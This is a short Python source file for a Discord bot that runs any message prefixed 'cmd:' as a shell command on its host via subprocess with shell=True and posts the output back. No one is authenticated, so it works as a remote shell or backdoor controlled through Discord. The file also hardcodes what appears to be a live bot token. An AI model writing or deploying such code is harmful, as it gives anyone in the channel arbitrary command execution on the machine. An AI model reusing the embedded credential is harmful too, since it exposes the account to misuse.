import discord
import subprocess

# Bot token (replace with your actual token)
TOKEN = "MTMyMDExNTQ2NjM0MTA2MDY3MA.GnH6F4.CJGuAD6UtH0j0zd3qmDhyMQr3VZCBoRmzfykAc"

# Intents setup
intents = discord.Intents.default()
intents.message_content = True

# Create the bot client
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'Bot is logged in as {client.user} and ready!')

@client.event
async def on_message(message):
    # Ignore the bot's own messages
    if message.author == client.user:
        return

    # Check if the message starts with "cmd:"
    if message.content.startswith("cmd:"):
        command = message.content[4:].strip()  # Strip "cmd:" prefix
        await message.channel.send(f"Executing command: `{command}`")

        # Execute the command
        try:
            result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = result.stdout or result.stderr

            # Send the command output back to Discord
            if output:
                await message.channel.send(f"```\n{output}\n```")
            else:
                await message.channel.send("Command executed successfully with no output.")
        except Exception as e:
            await message.channel.send(f"Error: {str(e)}")

# Run the bot
client.run(TOKEN)
